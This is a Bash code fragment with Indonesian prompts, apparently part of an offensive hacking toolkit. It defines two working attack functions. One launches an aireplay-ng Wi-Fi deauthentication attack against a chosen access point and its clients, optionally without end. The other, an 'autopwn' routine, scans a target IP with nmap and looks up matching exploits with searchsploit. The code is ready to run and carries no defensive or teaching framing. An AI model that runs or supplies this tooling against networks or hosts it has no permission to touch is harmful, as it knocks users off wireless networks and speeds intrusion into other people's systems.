cmd_wifi_deauth_attack() {
  clear
  print_section "WIFI DEAUTH ATTACK"

  if ! command -v aireplay-ng >/dev/null 2>&1; then
    print_error "aircrack-ng belum install. apt install aircrack-ng"
    return
  fi

  echo -e "${RED}[!] BUTUH INTERFACE MODE MONITOR${NC}"
  echo ""
  read -p "Interface : " iface
  iface=${iface:-wlan0mon}

  read -p "BSSID target (MAC AP): " bssid
  [ -z "$bssid" ] && { print_error "BSSID kosong"; return; }

  read -p "Target client MAC [kosong=all]: " client
  read -p "Jumlah paket [0=infinite]: " count
  count=${count:-0}

  init_storage
  mkdir -p "$storage_path/offensive"
  log_file="$storage_path/offensive/deauth.log"

  print_keyval "Interface" "$iface"
  print_keyval "BSSID" "$bssid"
  print_keyval "Client" "${client:-ALL}"
  print_keyval "Count" "$count"
  echo ""
  print_error "Starting attack... CTRL+C to stop"
  echo ""

  if [ -z "$client" ]; then
    aireplay-ng --deauth "$count" -a "$bssid" "$iface" | tee -a "$log_file"
  else
    aireplay-ng --deauth "$count" -a "$bssid" -c "$client" "$iface" | tee -a "$log_file"
  fi

  log_save "OFFENSIVE: Wifi Deauth $bssid"
}

cmd_exploit_autopwn() {
  clear
  print_section "EXPLOIT AUTOPWN - SEARCHSPLOIT"

  if ! command -v searchsploit >/dev/null 2>&1; then
    print_error "searchsploit belum install. apt install exploitdb"
    return
  fi

  read -p "Target IP: " target
  [ -z "$target" ] && { print_error "Target kosong"; return; }

  init_storage
  mkdir -p "$storage_path/offensive"
  scan_file="$storage_path/offensive/nmap_sv_$target.txt"

  print_info "Step 1: Scanning services..."
  nmap -sV -Pn "$target" | tee "$scan_file"

  echo ""
  print_section "EXPLOIT MATCHING"
  echo ""

  grep -E "^[0-9]+/tcp" "$scan_file" | while read -r line; do
    port=$(echo "$line" | awk '{print $1}' | cut -d/ -f1)
    service=$(echo "$line" | awk '{print $3}')
    version=$(echo "$line" | cut -d' ' -f4-)

    [ -z "$version" ] && continue

    print_keyval "Port $port" "$service $version"

    result=$(searchsploit "$service $version" 2>/dev/null | grep -v "Exploits: No Results")

    if [ -n "$result" ]; then
      echo -e "${GREEN}[+] EXPLOIT FOUND:${NC}"
      echo "$result" | head -5
      echo ""
    else
      echo -e "${YELLOW}[-] No exploit${NC}"
      echo ""
    fi
  done

  log_save "OFFENSIVE: Exploit Autopwn $target"
  echo ""
  read -p "Tekan ENTER untuk kembali..."
}

